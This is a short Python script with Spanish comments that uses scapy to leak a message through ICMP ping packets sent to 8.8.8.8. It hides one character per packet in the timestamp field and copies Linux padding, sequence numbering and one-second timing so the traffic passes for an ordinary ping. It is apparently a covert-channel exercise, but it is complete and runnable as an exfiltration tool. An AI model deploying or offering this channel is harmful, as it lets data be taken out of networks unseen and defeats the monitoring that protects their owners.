import sys
import time
import struct
from scapy.all import IP, ICMP, send

def enviar_ping_stealth(mensaje):
    ip_dest = "8.8.8.8"
    
    # Generamos los 40 bytes de padding típicos de Linux (del 0x10 al 0x37)
    base_padding = bytes(range(0x10, 0x38)) 
    
    # Definimos un ID fijo para esta "sesión" de ping y un contador de secuencia
    id_ping = 4321
    seq_ping = 1

    for char in mensaje:
        # Generamos el timestamp de 8 bytes
        timestamp = struct.pack("<d", time.time())
        
        # INYECCIÓN STEALTH: Ponemos nuestro carácter en el 1er byte, 
        # luego los 7 bytes restantes del timestamp, y finalmente el padding.
        # Total = 1 + 7 + 40 = 48 bytes.
        payload_stealth = char.encode() + timestamp[1:] + base_padding
        
        # Construir y enviar el paquete ICMP Echo Request asignando el ID y sumando la secuencia
        paquete = IP(dst=ip_dest)/ICMP(type=8, code=0, id=id_ping, seq=seq_ping)/payload_stealth
        send(paquete, verbose=False)
        
        print("Sent 1 packets.")
        
        # Aumentamos la secuencia para el próximo paquete
        seq_ping += 1
        
        # Esperamos 1 segundo para emular la frecuencia de un ping real
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso correcto: sudo python3 pingv4.py \"<mensaje_cifrado>\"")
        sys.exit(1)

    mensaje_cifrado = sys.argv[1]
    enviar_ping_stealth(mensaje_cifrado)